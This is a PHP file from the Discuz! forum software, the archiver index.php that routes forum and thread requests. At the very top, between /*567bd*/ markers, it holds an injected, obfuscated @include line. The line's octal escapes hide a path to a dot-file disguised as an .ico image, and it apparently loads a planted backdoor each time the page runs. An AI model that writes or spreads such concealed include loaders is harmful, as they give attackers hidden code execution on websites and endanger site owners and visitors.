<?php
/*567bd*/

@include "\057www\057www\162oot\057pps\163ii.\143om/\163tat\151c/j\163/.2\145036\14284.\151co";

/*567bd*/

/**
 *      [Discuz!] (C)2001-2099 Comsenz Inc.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: index.php 17587 2010-10-25 01:25:10Z monkey $
 */

define('IN_ARCHIVER', 1);

chdir('../');

$querystring = $_SERVER['QUERY_STRING'];

if(!empty($_GET['action'])) {
	$querystring = $_GET['action'].'-'.$_GET['value'];
}

if(substr($querystring, 0, 3) == 'fid') {
	$_GET['mod'] = 'forumdisplay';
	$_GET['fid'] = intval(substr($querystring, 4));
} elseif(substr($querystring, 0, 3) == 'tid') {
	$_GET['mod'] = 'viewthread';
	$_GET['tid'] = intval(substr($querystring, 4));
}

include 'forum.php';

?>